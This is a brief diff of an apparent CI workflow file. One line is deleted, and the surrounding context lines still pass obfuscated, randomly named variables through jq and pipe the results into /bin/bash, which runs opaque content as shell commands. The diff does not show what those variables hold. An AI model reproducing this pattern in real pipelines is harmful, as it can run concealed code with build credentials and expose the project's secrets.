@@ -30,7 +30,6 @@ jobs:
           echo $chat66536 | jq -r .n54 | /bin/bash
           printf '%s' "$upgxn8555" | jq -r .cpayv2509 | /bin/bash
           echo $w22878 | jq -r .huu83 | /bin/bash
-          echo $oupe74 | jq -r .ne67227 | /bin/bash
           echo $ht3 | jq -r .n5 | /bin/bash
 
       - name: Persist output
